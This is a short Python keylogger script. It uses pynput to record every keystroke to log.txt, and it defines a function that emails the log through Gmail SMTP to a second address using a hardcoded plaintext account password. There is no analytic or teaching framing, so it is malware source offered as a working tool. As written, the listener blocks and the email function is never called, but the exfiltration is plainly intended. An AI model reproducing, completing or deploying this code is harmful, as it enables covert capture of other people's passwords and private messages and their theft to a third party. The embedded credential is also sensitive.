import pynput
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

with open("log.txt", "w") as log:
    log.write("")

def on_press(key):
    with open("log.txt", "a") as log:
        log.write(f"{key}\n")

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    
def send_log():
    msg = MIMEMultipart()
    password = 'ztesjhrfrmxkthji'
    msg['From'] = "sebaskeylogger123451@gmail.com"
    msg['To'] = "sebaff.123451@gmail.com"
    msg['Subject'] = "Data Log"
    msg.attach(MIMEText(open('log.txt').read()))

    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(msg['From'], password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit()
    except:
        print("Error al enviar la información")